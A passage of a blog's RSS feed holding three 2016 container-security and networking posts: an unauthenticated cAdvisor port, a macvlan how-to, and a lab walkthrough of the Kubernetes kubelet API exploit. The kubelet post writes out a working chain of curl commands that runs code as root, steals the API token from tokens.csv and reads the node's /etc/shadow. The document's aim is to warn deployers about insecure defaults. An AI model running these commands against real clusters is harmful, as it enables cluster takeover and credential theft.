&lt;p&gt;So first obvious thing to look at is the network attack surface. Open ports are a first option for an attacker who gets unauthorised access to a system.&lt;/p&gt;

&lt;p&gt;This cluster has three nodes on &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.41.233&lt;/code&gt; , &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.41.201&lt;/code&gt; and &lt;code class=&quot;highlighter-rouge&quot;&gt;192.168.41.232&lt;/code&gt; so we can start with&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;nmap -sT -n -p- 192.168.41.201,232,233&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;From that, we can see that there are some interesting ports to look at.  The first one I noticed is 4194/TCP.  On the cluster this is used by cAdvisor which provides metrics about your containers and is, by default, available without authentication.&lt;/p&gt;

&lt;p&gt;This provides quite a bit of information about the configuration of the cluster like a process list&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/media/cadvisor_processes.png&quot; alt=&quot;cadvisor process&quot; /&gt;&lt;/p&gt;

&lt;p&gt;and some details on the configuration of the docker daemon on the host&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;/assets/media/cadvisor_docker.png&quot; alt=&quot;cadvisor docker&quot; /&gt;&lt;/p&gt;

&lt;p&gt;There’s also a set of handy API endpoints if you want to dump the information in JSON format.  For example, to get the spec for all the containers running on a host you can just go to &lt;code class=&quot;highlighter-rouge&quot;&gt;http://192.168.41.233:4194/api/v2.0/spec?recursive=true&lt;/code&gt; and get output like&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;    &quot;/docker/0598e0682955545ef27486ce3c04d62b6e1dc15496fb8072c297f2b548e7e10f&quot;: {
        &quot;creation_time&quot;: &quot;2016-10-09T03:55:54.113949226+01:00&quot;,
        &quot;aliases&quot;: [
            &quot;k8s_weave-npc.27539310_weave-net-xf53p_kube-system_af83b2df-8683-11e6-849b-000c29d33879_f938e1de&quot;,
            &quot;0598e0682955545ef27486ce3c04d62b6e1dc15496fb8072c297f2b548e7e10f&quot;
        ],
        &quot;namespace&quot;: &quot;docker&quot;,
        &quot;labels&quot;: {
            &quot;io.kubernetes.container.hash&quot;: &quot;27539310&quot;,
            &quot;io.kubernetes.container.name&quot;: &quot;weave-npc&quot;,
            &quot;io.kubernetes.container.restartCount&quot;: &quot;0&quot;,
            &quot;io.kubernetes.container.terminationMessagePath&quot;: &quot;/dev/termination-log&quot;,
            &quot;io.kubernetes.pod.name&quot;: &quot;weave-net-xf53p&quot;,
            &quot;io.kubernetes.pod.namespace&quot;: &quot;kube-system&quot;,
            &quot;io.kubernetes.pod.terminationGracePeriod&quot;: &quot;30&quot;,
            &quot;io.kubernetes.pod.uid&quot;: &quot;af83b2df-8683-11e6-849b-000c29d33879&quot;
        },
        &quot;has_cpu&quot;: true,
        &quot;cpu&quot;: {
            &quot;limit&quot;: 10,
            &quot;max_limit&quot;: 0,
            &quot;mask&quot;: &quot;0-1&quot;
        },
        &quot;has_memory&quot;: true,
        &quot;memory&quot;: {
            &quot;limit&quot;: 9223372036854771712,
            &quot;reservation&quot;: 9223372036854771712
        },
        &quot;has_custom_metrics&quot;: false,
        &quot;has_network&quot;: false,
        &quot;has_filesystem&quot;: true,
        &quot;has_diskio&quot;: true,
        &quot;image&quot;: &quot;weaveworks/weave-npc:1.7.0&quot;
    },
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This isn’t as serious an issue as the kubelet exploit of course, but still something you’d want to change in your deployment of Kubernetes to harden it.&lt;/p&gt;

&lt;p&gt;After noting this I had a look through the Kubernetes issue list and it looks like this is a &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/11710&quot;&gt;known issue&lt;/a&gt; but unfortunately not one with a clear fix for now, so it’d need something like an iptables rule applied to restrict access to it.&lt;/p&gt;

</description>
				<pubDate>Fri, 14 Oct 2016 19:05:39 +0100</pubDate>
				<link>/blog/2016/10/14/Kubernetes-Attack-Surface-cAdvisor/</link>
				<guid isPermaLink="true">/blog/2016/10/14/Kubernetes-Attack-Surface-cAdvisor/</guid>
			</item>
		
			<item>
				<title>Kubernetes - From Container to Cluster</title>
				<description>&lt;p&gt;I’ve been reading up on Kubernetes a bit recently and &lt;a href=&quot;https://twitter.com/killahertz_&quot;&gt;Jesse Hertz&lt;/a&gt; pointed me at an interesting item around Kubernetes security that illustrates common problem of insecure defaults, so I thought it might be worth a post walking through the issue, mainly as a way for me to improve my Kubernetes knowledge but also could be useful for others who are deploying it.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;&lt;strong&gt;td;dr&lt;/strong&gt; if you can get access to the kubelet API port you can control the whole cluster and default configurations of Kubernetes are likely to make this possible, so be careful when setting up your clusters.&lt;/p&gt;

&lt;hr /&gt;

&lt;p&gt;So the issue I wanted to look at is this &lt;a href=&quot;https://github.com/kayrus/kubelet-exploit&quot;&gt;kubelet exploit&lt;/a&gt;.  Basically the kubelet is the service which runs on Kubernetes nodes and manages things like the docker installation on that node amongst other things.  It receives commands from the API server which co-ordinates the actions of the nodes in the cluster.&lt;/p&gt;

&lt;p&gt;The security problem lies in the fact that by default the kubelet service listens on a TCP/IP port with no authentication or authorization control, so anyone who can reach that port at a network level can execute kubelet commands just by issuing HTTP requests to the service.&lt;/p&gt;

&lt;p&gt;This means that an attacker who can get access to that port can basically take over the whole cluster pretty easily.&lt;/p&gt;

&lt;p&gt;The kubernetes team are well aware of this issue but a fix isn’t planned until &lt;a href=&quot;https://github.com/kubernetes/kubernetes/issues/11816&quot;&gt;Kubernetes 1.5&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;There’s also a workaround mentioned on the kubelet-exploit page which involves binding the kubelet to 127.0.0.1 and then connecting it to the kube-apiserver via SSH tunnels.&lt;/p&gt;

&lt;p&gt;To explore this problem I followed the &lt;a href=&quot;http://kubernetes.io/docs/getting-started-guides/kubeadm/&quot;&gt;kubeadm guide&lt;/a&gt; from the kubernetes site.  Kubeadm is a tool which allows for clusters to be easily set up and appears to somewhat be modeled after some of the docker swarm commands.&lt;/p&gt;

&lt;p&gt;I followed the tutorial through to the point where I had a working cluster, taking all the defaults.&lt;/p&gt;

&lt;p&gt;Then I deployed a container with some tools into the cluster, the scenario we’re testing is that an attacker has gained access to a container in the cluster, and we’ll see what they can do to take control of the cluster with only that access&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;kubectl run -i -t badcontainer --image=kalilinux/kali-linux-docker
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;which after a while for the image to download gives us a bash shell running in a container on the cluster.&lt;/p&gt;

&lt;p&gt;So now we can scan round to see whether the port we’re looking for is available.&lt;/p&gt;

&lt;p&gt;First add some tools to our build&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apt update
apt install nmap curl
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Then scan the network. In this case my main network where the nodes are installed is 192.168.41.0/24&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;nmap -sT -v -n -p10250 192.168.41.0/24
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;from that we get back a bunch of filtered ports but also three open ones which are the IP addresses of my kubernetes nodes.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Nmap scan report for 192.168.41.201
Host is up (0.00013s latency).
PORT      STATE SERVICE
10250/tcp open  unknown

Nmap scan report for 192.168.41.232
Host is up (0.000065s latency).
PORT      STATE SERVICE
10250/tcp open  unknown

Nmap scan report for 192.168.41.233
Host is up (0.00020s latency).
PORT      STATE SERVICE
10250/tcp open  unknown
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Now we can use some of the kubectl commands mentioned in the exploit to start getting more access to the cluster.  First up lets enumerate our containers&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -sk https://192.168.41.233:10250/runningpods/ | python -mjson.tool
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;This returns a list of the pods running on the node in JSON form, and also the images they’re based on.  The most interesting one here is&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;w&quot;&gt;      &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;metadata&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;creationTimestamp&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;kc&quot;&gt;null&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kube-apiserver-kube&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;namespace&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kube-system&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;uid&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;0446d05fb9406214210e8d29397f8bf2&quot;&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;spec&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;containers&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;image&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;gcr.io/google_containers/kube-apiserver-amd64:v1.4.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;kube-apiserver&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;resources&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;image&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;gcr.io/google_containers/pause-amd64:3.0&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;name&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;s2&quot;&gt;&quot;POD&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                        &lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;&quot;resources&quot;&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;:&lt;/span&gt;&lt;span class=&quot;w&quot;&gt; &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;{}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                    &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;}&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
                &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;]&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;
            &lt;/span&gt;&lt;span class=&quot;p&quot;&gt;},&lt;/span&gt;&lt;span class=&quot;w&quot;&gt;

&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;it’s running the kube-apiserver image, so that’ll be our API server.  As I mentioned earlier the API server is basically the heart of the cluster, so access to it provides a lot of control over the cluster itself.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -XPOST &quot;https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver&quot; -d &quot;cmd=ls -la /&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;lists the files in the root directory of that container and if we run&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -XPOST &quot;https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver&quot; -d &quot;cmd=whoami&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;We get back the answer that every pentester likes to see which is &lt;code class=&quot;highlighter-rouge&quot;&gt;root&lt;/code&gt; !&lt;/p&gt;

&lt;p&gt;So at this point, that’s pretty bad news for the cluster owner.  A rogue container should not be able to execute privileged commands on the API server of the cluster.&lt;/p&gt;

&lt;p&gt;So the next step in the attack would be to take over the cluster, for which the easiest way is likely to be getting control of the API server, as that lets us create new containers amongst other things.&lt;/p&gt;

&lt;p&gt;if we do&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -XPOST &quot;https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver&quot; -d &quot;cmd=ps -ef&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;we can see the process list for the API server which handily provides the path of the token file that Kubernetes uses to authenticate access to the API&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;PID   USER     TIME   COMMAND
    1 root       2:29 /usr/local/bin/kube-apiserver --v=4 --insecure-bind-address=127.0.0.1 --etcd-servers=http://127.0.0.1:2379 --admission-control=NamespaceLifecycle,LimitRanger,ServiceAccount,PersistentVolumeLabel,DefaultStorageClass,ResourceQuota --service-cluster-ip-range=100.64.0.0/12 --service-account-key-file=/etc/kubernetes/pki/apiserver-key.pem --client-ca-file=/etc/kubernetes/pki/ca.pem --tls-cert-file=/etc/kubernetes/pki/apiserver.pem --tls-private-key-file=/etc/kubernetes/pki/apiserver-key.pem --token-auth-file=/etc/kubernetes/pki/tokens.csv --secure-port=443 --allow-privileged --etcd-servers=http://127.0.0.1:2379
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;here we can see that it’s &lt;code class=&quot;highlighter-rouge&quot;&gt;/etc/kubernetes/pki/tokens.csv&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;so then we can just cat out that file&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -XPOST &quot;https://192.168.41.233:10250/run/kube-system/kube-apiserver-kube/kube-apiserver&quot; -d &quot;cmd=cat /etc/kubernetes/pki/tokens.csv&quot;
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;
&lt;p&gt;and we get the token which is the first field listed&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;d65ba5f070e714ab,kubeadm-node-csr,9738242e-8681-11e6-b5b4-000c29d33879,system:kubelet-bootstrap
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;Now we can communicate directly with the Kubernetes API like so&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;curl -k -X GET -H &quot;Authorization: Bearer d65ba5f070e714ab&quot; https://192.168.41.233
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;this gives us easier control of the cluster than we had from just running individual commands on it.&lt;/p&gt;

&lt;p&gt;We could persist with the HTTP API but TBH I find it easier to use kubectl, so we can just download that and point it at our cluster with our newly acquired token.&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;wget https://storage.googleapis.com/kubernetes-release/release/v1.4.0/bin/linux/amd64/kubectl
chmod +x kubectl
./kubectl config set-cluster test --server=https://192.168.41.233
./kubectl config set-credentials cluster-admin --token=d65ba5f070e714ab
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;From here, the next step it to look at getting access to the underlying nodes.  This can be achieved by mapping in a volume from the node to a container that we run.&lt;/p&gt;

&lt;p&gt;so if we create a file called test-pod.yml&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;apiVersion: v1
kind: Pod
metadata:
  name: test-pd
spec:
  containers:
  - image: nginx
    name: test-container
    volumeMounts:
    - mountPath: /test-pd
      name: test-volume
  volumes:
  - name: test-volume
    hostPath:
      # directory location on host
      path: /etc
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;and start it up with &lt;code class=&quot;highlighter-rouge&quot;&gt;./kubectl create -f test-pod.yml&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;we can then run a command to cat out the /etc/shadow file of the underlying node&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./kubectl exec test-pd -c test-container cat /test-pd/shadow
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;From there it’s just a bit of password cracking needed and we get shell access to the underlying node.&lt;/p&gt;

&lt;p&gt;So from that we can see that there’s definitely something to think about if you’re going to run a Kubernetes cluster in production, i.e. protect access to the kubectl API port…&lt;/p&gt;
</description>
				<pubDate>Sat, 08 Oct 2016 10:05:39 +0100</pubDate>
				<link>/blog/2016/10/08/Kubernetes-From-Container-To-Cluster/</link>
				<guid isPermaLink="true">/blog/2016/10/08/Kubernetes-From-Container-To-Cluster/</guid>
			</item>
		
			<item>
				<title>Docker 1.12 - Macvlan</title>
				<description>&lt;p&gt;Another new cool facet of the 1.12 release of Docker Engine is that Macvlan and Ipvlan support is leaving experimental and is available for all users.  So now instead of the rather convoluted procedure I mentioned &lt;a href=&quot;https://raesene.github.io/blog/2016/02/07/Exploration-in-Docker-bridging/&quot;&gt;last time I looked at this&lt;/a&gt; we can now simplify the setup of containers attached to the same network as the host, removing the need for NAT translation from the container network to the host network.&lt;/p&gt;

&lt;p&gt;An aside first is that it can get a little confusing with Docker’s naming as you may be thinking “hey I already have containers on the docker bridge isn’t that already like being connected to the host network?”.  Well as explained &lt;a href=&quot;http://hicu.be/docker-container-network-types&quot;&gt;here&lt;/a&gt; what docker calls “bridged” is really “NAT” and macvlan is what most people would think of as “bridged”!&lt;/p&gt;

&lt;p&gt;Anyway, the first step in getting a container online directly with the host interface is to create a new macvlan network&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker network create -d macvlan --subnet=192.168.41.0/24 --gateway=192.168.41.1 --ip-range=192.168.41.128/26 -o parent=ens33 testnet
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;So in this example our host network’s subnet is 192.168.41.0/24 and our gateway is just the default gateway for that network.  Where it gets a little interesting is that we need to specify an ip range that docker can use to hand out to containers that connect to this network.  At the moment there’s no supported way to get containers connecting to a macvlan network to use the host network’s DHCP server so you need to either specify an &lt;code class=&quot;highlighter-rouge&quot;&gt;--ip-range &lt;/code&gt; with a range that’s available and doesn’t overlap with a DHCP scope on the host network or alternatively you can pass &lt;code class=&quot;highlighter-rouge&quot;&gt;--ip &amp;lt;address&amp;gt;&lt;/code&gt; to the individual &lt;code class=&quot;highlighter-rouge&quot;&gt;docker run&lt;/code&gt; commands that we use to create containers on this network.&lt;/p&gt;

&lt;p&gt;Once you’ve created the network it’s just a question of specifying the network to use in the docker run command, so something like&lt;/p&gt;

&lt;div class=&quot;highlighter-rouge&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;docker run -it --network=testnet ubuntu:16.04 /bin/bash
&lt;/code&gt;&lt;/pre&gt;
&lt;/div&gt;

&lt;p&gt;should give you a container, likely with an address of 192.168.41.128 in this case.&lt;/p&gt;

&lt;p&gt;A couple of other points worth noting about macvlan support.  You can only have one macvlan or ipvlan network setup on a Docker engine instance at the moment (although obviously you can have multiple containers connected to it), and from the macvlan network, you won’t be able to contact the IP address of the host system.&lt;/p&gt;

&lt;p&gt;For more reading on this topic there’s a great set of articles at hicu.be on &lt;a href=&quot;http://hicu.be/docker-networking-macvlan-bridge-mode-configuration&quot;&gt;macvlan networking&lt;/a&gt; and &lt;a href=&quot;http://hicu.be/bridge-vs-macvlan&quot;&gt;bridges vs macvlan&lt;/a&gt; amongst others.&lt;/p&gt;

</description>
				<pubDate>Sat, 23 Jul 2016 10:05:39 +0100</pubDate>
				<link>/blog/2016/07/23/Docker-MacVLAN/</link>
				<guid isPermaLink="true">/blog/2016/07/23/Docker-MacVLAN/</guid>
			</item>
		
	</channel>
</rss>
